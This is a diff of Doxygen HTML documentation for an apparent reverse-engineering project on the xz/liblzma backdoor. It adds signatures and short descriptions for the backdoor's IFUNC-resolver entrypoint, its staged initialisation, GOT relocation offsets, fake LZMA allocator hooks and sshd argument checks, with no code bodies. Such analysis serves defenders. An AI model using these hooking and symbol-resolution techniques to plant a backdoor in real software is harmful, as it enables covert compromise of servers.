@@ -78,6 +78,7 @@ $(function() {
 <div class="textblock"><code>#include &lt;assert.h&gt;</code><br />
 <code>#include &lt;stddef.h&gt;</code><br />
 <code>#include &lt;stdint.h&gt;</code><br />
+<code>#include &lt;sys/select.h&gt;</code><br />
 <code>#include &lt;lzma.h&gt;</code><br />
 <code>#include &lt;openssl/dsa.h&gt;</code><br />
 <code>#include &lt;openssl/ec.h&gt;</code><br />
@@ -147,6 +148,12 @@ Data Structures</h2></td></tr>
 <tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__ctx__t.html">key_ctx_t</a></td></tr>
 <tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__cpuid__reloc__consts__t.html">backdoor_cpuid_reloc_consts_t</a></td></tr>
+<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__tls__get__addr__reloc__consts__t.html">backdoor_tls_get_addr_reloc_consts_t</a></td></tr>
+<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__functions__t.html">elf_functions_t</a></td></tr>
+<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
 </table><table class="memberdecls">
 <tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="define-members"></a>
 Macros</h2></td></tr>
@@ -204,6 +211,9 @@ typedef uint64_t&#160;</td><td class="memItemRight" valign="bottom"><b>u64</b></
 <tr class="memitem:a93a1409151dffdb2c15147214279817a"><td class="memItemLeft" align="right" valign="top"><a id="a93a1409151dffdb2c15147214279817a"></a>
 typedef uintptr_t&#160;</td><td class="memItemRight" valign="bottom"><b>uptr</b></td></tr>
 <tr class="separator:a93a1409151dffdb2c15147214279817a"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a74c374136cf9a969dde2585536c808ac"><td class="memItemLeft" align="right" valign="top"><a id="a74c374136cf9a969dde2585536c808ac"></a>
+typedef Elf64_Xword&#160;</td><td class="memItemRight" valign="bottom"><b>Elf64_Relr</b></td></tr>
+<tr class="separator:a74c374136cf9a969dde2585536c808ac"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:a050c65e107f0c828f856a231f4b4e788"><td class="memItemLeft" align="right" valign="top"><a id="a050c65e107f0c828f856a231f4b4e788"></a>
 typedef int&#160;</td><td class="memItemRight" valign="bottom"><b>BOOL</b></td></tr>
 <tr class="separator:a050c65e107f0c828f856a231f4b4e788"><td class="memSeparator" colspan="2">&#160;</td></tr>
@@ -947,6 +957,30 @@ Functions</h2></td></tr>
 <tr class="memitem:a667cb717343a98ce25a91c16911da1dc"><td class="memItemLeft" align="right" valign="top"><a id="a667cb717343a98ce25a91c16911da1dc"></a>
 &#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx__t.html">key_ctx_t</a>, payload, 0x15)</td></tr>
 <tr class="separator:a667cb717343a98ce25a91c16911da1dc"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"><td class="memItemLeft" align="right" valign="top"><a id="ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"></a>
+&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts__t.html">backdoor_cpuid_reloc_consts_t</a>, cpuid_random_symbol_got_offset, 0)</td></tr>
+<tr class="separator:ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a2722de50727bad809faaa9434ff0057c"><td class="memItemLeft" align="right" valign="top"><a id="a2722de50727bad809faaa9434ff0057c"></a>
+&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts__t.html">backdoor_cpuid_reloc_consts_t</a>, cpuid_got_index, 0x8)</td></tr>
+<tr class="separator:a2722de50727bad809faaa9434ff0057c"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aff72cca79305fdddb7b9e4c9220435b1"><td class="memItemLeft" align="right" valign="top"><a id="aff72cca79305fdddb7b9e4c9220435b1"></a>
+&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts__t.html">backdoor_cpuid_reloc_consts_t</a>, backdoor_init_stage2_got_offset, 0x10)</td></tr>
+<tr class="separator:aff72cca79305fdddb7b9e4c9220435b1"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aa6f70bf34b2ca798ff98804347584dc9"><td class="memItemLeft" align="right" valign="top"><a id="aa6f70bf34b2ca798ff98804347584dc9"></a>
+&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__tls__get__addr__reloc__consts__t.html">backdoor_tls_get_addr_reloc_consts_t</a>, tls_get_addr_plt_offset, 0)</td></tr>
+<tr class="separator:aa6f70bf34b2ca798ff98804347584dc9"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:afa52c8b137a12acb824f5dad8c6ea6bc"><td class="memItemLeft" align="right" valign="top"><a id="afa52c8b137a12acb824f5dad8c6ea6bc"></a>
+&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__tls__get__addr__reloc__consts__t.html">backdoor_tls_get_addr_reloc_consts_t</a>, tls_get_addr_random_symbol_got_offset, 0x8)</td></tr>
+<tr class="separator:afa52c8b137a12acb824f5dad8c6ea6bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a18460a1b4dbb166717cbc7013c71afc2"><td class="memItemLeft" align="right" valign="top"><a id="a18460a1b4dbb166717cbc7013c71afc2"></a>
+&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions__t.html">elf_functions_t</a>, <a class="el" href="xzre_8h.html#abbcfd61778019372e0cabdf79b98824d">init_hook_functions</a>, 0)</td></tr>
+<tr class="separator:a18460a1b4dbb166717cbc7013c71afc2"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:afe9153c35058fa1d62699a50254d6916"><td class="memItemLeft" align="right" valign="top"><a id="afe9153c35058fa1d62699a50254d6916"></a>
+&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions__t.html">elf_functions_t</a>, <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109">elf_symbol_get_addr</a>, 0x8)</td></tr>
+<tr class="separator:afe9153c35058fa1d62699a50254d6916"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:ac01646d794f57b1d1b5b58eb757fb35b"><td class="memItemLeft" align="right" valign="top"><a id="ac01646d794f57b1d1b5b58eb757fb35b"></a>
+&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions__t.html">elf_functions_t</a>, <a class="el" href="xzre_8h.html#a049328971f4e99ce954d5e0346fee6d7">elf_parse</a>, 0x10)</td></tr>
+<tr class="separator:ac01646d794f57b1d1b5b58eb757fb35b"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:a52d510f0bbb31de19d8d20bf1acaeb5f"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a52d510f0bbb31de19d8d20bf1acaeb5f">x86_dasm</a> (<a class="el" href="structdasm__ctx__t.html">dasm_ctx_t</a> *ctx, u8 *code_start, u8 *code_end)</td></tr>
 <tr class="memdesc:a52d510f0bbb31de19d8d20bf1acaeb5f"><td class="mdescLeft">&#160;</td><td class="mdescRight">disassembles the given x64 code  <a href="xzre_8h.html#a52d510f0bbb31de19d8d20bf1acaeb5f">More...</a><br /></td></tr>
 <tr class="separator:a52d510f0bbb31de19d8d20bf1acaeb5f"><td class="memSeparator" colspan="2">&#160;</td></tr>
@@ -987,8 +1021,11 @@ Functions</h2></td></tr>
 <tr class="memdesc:a049328971f4e99ce954d5e0346fee6d7"><td class="mdescLeft">&#160;</td><td class="mdescRight">Parses the given in-memory ELF file into <a class="el" href="structelf__info.html">elf_info</a>.  <a href="xzre_8h.html#a049328971f4e99ce954d5e0346fee6d7">More...</a><br /></td></tr>
 <tr class="separator:a049328971f4e99ce954d5e0346fee6d7"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:a642ed90d3ade30228b3286310de5e5c1"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a642ed90d3ade30228b3286310de5e5c1">main_elf_parse</a> (<a class="el" href="structmain__elf__t.html">main_elf_t</a> *main_elf)</td></tr>
-<tr class="memdesc:a642ed90d3ade30228b3286310de5e5c1"><td class="mdescLeft">&#160;</td><td class="mdescRight">parses the main executable from the provided structure. as part of the process, argv0 will be retrieved and checked to see if it's the expected one (/usr/sbin/sshd)  <a href="xzre_8h.html#a642ed90d3ade30228b3286310de5e5c1">More...</a><br /></td></tr>
+<tr class="memdesc:a642ed90d3ade30228b3286310de5e5c1"><td class="mdescLeft">&#160;</td><td class="mdescRight">parses the main executable from the provided structure as part of the process the arguments and environment is checked  <a href="xzre_8h.html#a642ed90d3ade30228b3286310de5e5c1">More...</a><br /></td></tr>
 <tr class="separator:a642ed90d3ade30228b3286310de5e5c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aeba34776520881226359e3a0524fbe7b"><td class="memItemLeft" align="right" valign="top"><a id="aeba34776520881226359e3a0524fbe7b"></a>
+char *&#160;</td><td class="memItemRight" valign="bottom"><b>check_argument</b> (char arg_first_char, char *arg_name)</td></tr>
+<tr class="separator:aeba34776520881226359e3a0524fbe7b"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:a6925f05854b05bb9441f71c3f1deb55c"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6925f05854b05bb9441f71c3f1deb55c">elf_find_string_references</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, <a class="el" href="structstring__references__t.html">string_references_t</a> *refs)</td></tr>
 <tr class="memdesc:a6925f05854b05bb9441f71c3f1deb55c"><td class="mdescLeft">&#160;</td><td class="mdescRight">parses the ELF rodata section, looking for strings and the instructions that reference them  <a href="xzre_8h.html#a6925f05854b05bb9441f71c3f1deb55c">More...</a><br /></td></tr>
 <tr class="separator:a6925f05854b05bb9441f71c3f1deb55c"><td class="memSeparator" colspan="2">&#160;</td></tr>
@@ -1016,12 +1053,24 @@ Functions</h2></td></tr>
 <tr class="memitem:acb54dcbcba1c88075c523678a0d0dbda"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#acb54dcbcba1c88075c523678a0d0dbda">elf_get_got_symbol</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id)</td></tr>
 <tr class="memdesc:acb54dcbcba1c88075c523678a0d0dbda"><td class="mdescLeft">&#160;</td><td class="mdescRight">Gets the GOT symbol with name <code>encoded_string_id</code> from the parsed ELF file.  <a href="xzre_8h.html#acb54dcbcba1c88075c523678a0d0dbda">More...</a><br /></td></tr>
 <tr class="separator:acb54dcbcba1c88075c523678a0d0dbda"><td class="memSeparator" colspan="2">&#160;</td></tr>
-<tr class="memitem:a0adc703b5d67d3b105dc16a6a3ed9719"><td class="memItemLeft" align="right" valign="top">char *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0adc703b5d67d3b105dc16a6a3ed9719">elf_find_string</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u32 *stringId_inOut, void *rodata_start_ptr)</td></tr>
-<tr class="memdesc:a0adc703b5d67d3b105dc16a6a3ed9719"><td class="mdescLeft">&#160;</td><td class="mdescRight">Locates a string in the ELF .rodata section.  <a href="xzre_8h.html#a0adc703b5d67d3b105dc16a6a3ed9719">More...</a><br /></td></tr>
-<tr class="separator:a0adc703b5d67d3b105dc16a6a3ed9719"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:ad86c0039d3a08468f5cf7187662ebab9"><td class="memItemLeft" align="right" valign="top">char *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad86c0039d3a08468f5cf7187662ebab9">elf_find_string</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId *stringId_inOut, void *rodata_start_ptr)</td></tr>
+<tr class="memdesc:ad86c0039d3a08468f5cf7187662ebab9"><td class="mdescLeft">&#160;</td><td class="mdescRight">Locates a string in the ELF .rodata section.  <a href="xzre_8h.html#ad86c0039d3a08468f5cf7187662ebab9">More...</a><br /></td></tr>
+<tr class="separator:ad86c0039d3a08468f5cf7187662ebab9"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:abc618a02e31b94194ce03b0c4a2b3597"><td class="memItemLeft" align="right" valign="top">lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#abc618a02e31b94194ce03b0c4a2b3597">get_lzma_allocator</a> ()</td></tr>
 <tr class="memdesc:abc618a02e31b94194ce03b0c4a2b3597"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the fake LZMA allocator, used for imports resolution the "opaque" field of the structure holds a pointer to  <a href="xzre_8h.html#abc618a02e31b94194ce03b0c4a2b3597">More...</a><br /></td></tr>
 <tr class="separator:abc618a02e31b94194ce03b0c4a2b3597"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a69f76638809572b5f358545f8fb8035e"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a69f76638809572b5f358545f8fb8035e">get_lzma_allocator_address</a> ()</td></tr>
+<tr class="memdesc:a69f76638809572b5f358545f8fb8035e"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the address of the fake LZMA allocator  <a href="xzre_8h.html#a69f76638809572b5f358545f8fb8035e">More...</a><br /></td></tr>
+<tr class="separator:a69f76638809572b5f358545f8fb8035e"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584">fake_lzma_alloc</a> (void *opaque, size_t nmemb, size_t size)</td></tr>
+<tr class="memdesc:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="mdescLeft">&#160;</td><td class="mdescRight">a fake free function called by lzma_free() that then calls <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109" title="Looks up an ELF symbol from a parsed ELF, and returns its memory address.">elf_symbol_get_addr()</a>  <a href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584">More...</a><br /></td></tr>
+<tr class="separator:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a5565761b59b3ef6786b83a9b50f72b17"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17">fake_lzma_free</a> (void *opaque, void *ptr)</td></tr>
+<tr class="memdesc:a5565761b59b3ef6786b83a9b50f72b17"><td class="mdescLeft">&#160;</td><td class="mdescRight">a fake free function called by lzma_free()  <a href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17">More...</a><br /></td></tr>
+<tr class="separator:a5565761b59b3ef6786b83a9b50f72b17"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aa3c963b13e204d9d99ab57a5647e9b45"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structelf__functions__t.html">elf_functions_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aa3c963b13e204d9d99ab57a5647e9b45">get_elf_functions_address</a> ()</td></tr>
+<tr class="memdesc:aa3c963b13e204d9d99ab57a5647e9b45"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the address of the elf_functions  <a href="xzre_8h.html#aa3c963b13e204d9d99ab57a5647e9b45">More...</a><br /></td></tr>
+<tr class="separator:aa3c963b13e204d9d99ab57a5647e9b45"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:a130ba7ecb28e28acacb98c965d80dba3"><td class="memItemLeft" align="right" valign="top"><a id="a130ba7ecb28e28acacb98c965d80dba3"></a>
 BOOL&#160;</td><td class="memItemRight" valign="bottom"><b>secret_data_append_from_instruction</b> (<a class="el" href="structdasm__ctx__t.html">dasm_ctx_t</a> *dctx, <a class="el" href="unionsecret__data__shift__cursor.html">secret_data_shift_cursor</a> *cursor)</td></tr>
 <tr class="separator:a130ba7ecb28e28acacb98c965d80dba3"><td class="memSeparator" colspan="2">&#160;</td></tr>
@@ -1040,12 +1089,23 @@ BOOL&#160;</td><td class="memItemRight" valign="bottom"><b>secret_data_append_fr
 <tr class="memitem:a229ee0bd4111363061bc4230bc1f6423"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a> (<a class="el" href="structbackdoor__setup__params__t.html">backdoor_setup_params_t</a> *params)</td></tr>
 <tr class="memdesc:a229ee0bd4111363061bc4230bc1f6423"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoor main method  <a href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">More...</a><br /></td></tr>
 <tr class="separator:a229ee0bd4111363061bc4230bc1f6423"><td class="memSeparator" colspan="2">&#160;</td></tr>
-<tr class="memitem:ab7be493b2cf2f02aa9842aaf552977a0"><td class="memItemLeft" align="right" valign="top"><a id="ab7be493b2cf2f02aa9842aaf552977a0"></a>
-void&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_init</b> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *ctx, u64 *caller_frame)</td></tr>
-<tr class="separator:ab7be493b2cf2f02aa9842aaf552977a0"><td class="memSeparator" colspan="2">&#160;</td></tr>
-<tr class="memitem:a00ce1a85628bd873f784fe12c875630f"><td class="memItemLeft" align="right" valign="top"><a id="a00ce1a85628bd873f784fe12c875630f"></a>
-BOOL&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_init_stage2</b> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *ctx)</td></tr>
-<tr class="separator:a00ce1a85628bd873f784fe12c875630f"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a3659cb57f57dd0237ecb194e13d35b19"><td class="memItemLeft" align="right" valign="top">unsigned int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3659cb57f57dd0237ecb194e13d35b19">backdoor_init</a> (unsigned int ext, u64 *caller_frame)</td></tr>
+<tr class="memdesc:a3659cb57f57dd0237ecb194e13d35b19"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <a class="el" href="xzre_8h.html#ac7c10c84bc0699f1ba58698764ae0258" title="calls backdoor_init_stage2()">call_backdoor_init_stage2()</a> while in the crc64() IFUNC resolver function  <a href="xzre_8h.html#a3659cb57f57dd0237ecb194e13d35b19">More...</a><br /></td></tr>
+<tr class="separator:a3659cb57f57dd0237ecb194e13d35b19"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:ac7c10c84bc0699f1ba58698764ae0258"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ac7c10c84bc0699f1ba58698764ae0258">call_backdoor_init_stage2</a> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *ctx, u64 *caller_frame)</td></tr>
+<tr class="memdesc:ac7c10c84bc0699f1ba58698764ae0258"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a>  <a href="xzre_8h.html#ac7c10c84bc0699f1ba58698764ae0258">More...</a><br /></td></tr>
+<tr class="separator:ac7c10c84bc0699f1ba58698764ae0258"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:abf19222b4917f772ad487a2970dd51ec"><td class="memItemLeft" align="right" valign="top">ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#abf19222b4917f772ad487a2970dd51ec">init_elf_entry_ctx</a> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *ctx)</td></tr>
+<tr class="memdesc:abf19222b4917f772ad487a2970dd51ec"><td class="mdescLeft">&#160;</td><td class="mdescRight">initialises the <a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a>  <a href="xzre_8h.html#abf19222b4917f772ad487a2970dd51ec">More...</a><br /></td></tr>
+<tr class="separator:abf19222b4917f772ad487a2970dd51ec"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:ad33792d2db40b95a7b434081d1608ca4"><td class="memItemLeft" align="right" valign="top">ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad33792d2db40b95a7b434081d1608ca4">get_got_offset</a> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *ctx)</td></tr>
+<tr class="memdesc:ad33792d2db40b95a7b434081d1608ca4"><td class="mdescLeft">&#160;</td><td class="mdescRight">get the offset to the GOT  <a href="xzre_8h.html#ad33792d2db40b95a7b434081d1608ca4">More...</a><br /></td></tr>
+<tr class="separator:ad33792d2db40b95a7b434081d1608ca4"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aee7738c9cab5f6733c666e0a20e5ba99"><td class="memItemLeft" align="right" valign="top">u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99">get_cpuid_got_index</a> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *ctx)</td></tr>
+<tr class="memdesc:aee7738c9cab5f6733c666e0a20e5ba99"><td class="mdescLeft">&#160;</td><td class="mdescRight">get the cpuid() GOT index  <a href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99">More...</a><br /></td></tr>
+<tr class="separator:aee7738c9cab5f6733c666e0a20e5ba99"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a8ab85586c2cbdd03ee2f734b92e3e3d6"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *ctx, u64 *caller_frame, void **cpuid_got_addr, <a class="el" href="structbackdoor__cpuid__reloc__consts__t.html">backdoor_cpuid_reloc_consts_t</a> *reloc_consts)</td></tr>
+<tr class="separator:a8ab85586c2cbdd03ee2f734b92e3e3d6"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:a0d70747b6216270de07c783fc499938e"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0d70747b6216270de07c783fc499938e">resolve_libc_imports</a> (struct link_map *libc, <a class="el" href="structelf__info.html">elf_info_t</a> *libc_info, <a class="el" href="structlibc__imports__t.html">libc_imports_t</a> *imports)</td></tr>
 <tr class="memdesc:a0d70747b6216270de07c783fc499938e"><td class="mdescLeft">&#160;</td><td class="mdescRight">parses the libc ELF from the supplied link map, and resolves its imports  <a href="xzre_8h.html#a0d70747b6216270de07c783fc499938e">More...</a><br /></td></tr>
 <tr class="separator:a0d70747b6216270de07c783fc499938e"><td class="memSeparator" colspan="2">&#160;</td></tr>
@@ -1067,33 +1127,60 @@ BOOL&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_init_stage2<
 <tr class="memitem:a6189320317764e3344934873b58b30b1"><td class="memItemLeft" align="right" valign="top">EncodedStringId&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6189320317764e3344934873b58b30b1">get_string_id</a> (const char *string_begin, const char *string_end)</td></tr>
 <tr class="memdesc:a6189320317764e3344934873b58b30b1"><td class="mdescLeft">&#160;</td><td class="mdescRight">Get the.  <a href="xzre_8h.html#a6189320317764e3344934873b58b30b1">More...</a><br /></td></tr>
 <tr class="separator:a6189320317764e3344934873b58b30b1"><td class="memSeparator" colspan="2">&#160;</td></tr>
-<tr class="memitem:ab58b3c83a6d06a652fbc65c2271f5d13"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ab58b3c83a6d06a652fbc65c2271f5d13">_get_cpuid</a> (int cpuid_request, void *, void *, void *, void *, void *)</td></tr>
-<tr class="memdesc:ab58b3c83a6d06a652fbc65c2271f5d13"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoor entrypoint function, called by the IFUNC resolver  <a href="xzre_8h.html#ab58b3c83a6d06a652fbc65c2271f5d13">More...</a><br /></td></tr>
-<tr class="separator:ab58b3c83a6d06a652fbc65c2271f5d13"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a3c1f9d6a6a722f65a4fc7530ec2ffe2e"><td class="memItemLeft" align="right" valign="top">unsigned int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3c1f9d6a6a722f65a4fc7530ec2ffe2e">_get_cpuid</a> (unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame)</td></tr>
+<tr class="memdesc:a3c1f9d6a6a722f65a4fc7530ec2ffe2e"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64()  <a href="xzre_8h.html#a3c1f9d6a6a722f65a4fc7530ec2ffe2e">More...</a><br /></td></tr>
+<tr class="separator:a3c1f9d6a6a722f65a4fc7530ec2ffe2e"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aed5d1b3446090d6186a41841fb282df1"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aed5d1b3446090d6186a41841fb282df1">_cpuid</a> (unsigned int level, unsigned int *a, unsigned int *b, unsigned int *c, unsigned int *d)</td></tr>
+<tr class="memdesc:aed5d1b3446090d6186a41841fb282df1"><td class="mdescLeft">&#160;</td><td class="mdescRight">actually calls cpuid instruction  <a href="xzre_8h.html#aed5d1b3446090d6186a41841fb282df1">More...</a><br /></td></tr>
+<tr class="separator:aed5d1b3446090d6186a41841fb282df1"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:abbcfd61778019372e0cabdf79b98824d"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#abbcfd61778019372e0cabdf79b98824d">init_hook_functions</a> (<a class="el" href="structbackdoor__hooks__ctx__t.html">backdoor_hooks_ctx_t</a> *funcs)</td></tr>
 <tr class="memdesc:abbcfd61778019372e0cabdf79b98824d"><td class="mdescLeft">&#160;</td><td class="mdescRight">Initializes the structure with hooks-related data.  <a href="xzre_8h.html#abbcfd61778019372e0cabdf79b98824d">More...</a><br /></td></tr>
 <tr class="separator:abbcfd61778019372e0cabdf79b98824d"><td class="memSeparator" colspan="2">&#160;</td></tr>
-<tr class="memitem:a8cc394dd9e788d2b5166eedb8b155d1e"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8cc394dd9e788d2b5166eedb8b155d1e">update_got_address</a> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *entry_ctx)</td></tr>
-<tr class="memdesc:a8cc394dd9e788d2b5166eedb8b155d1e"><td class="mdescLeft">&#160;</td><td class="mdescRight">recomputes the GOT address  <a href="xzre_8h.html#a8cc394dd9e788d2b5166eedb8b155d1e">More...</a><br /></td></tr>
-<tr class="separator:a8cc394dd9e788d2b5166eedb8b155d1e"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c">update_got_address</a> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *entry_ctx)</td></tr>
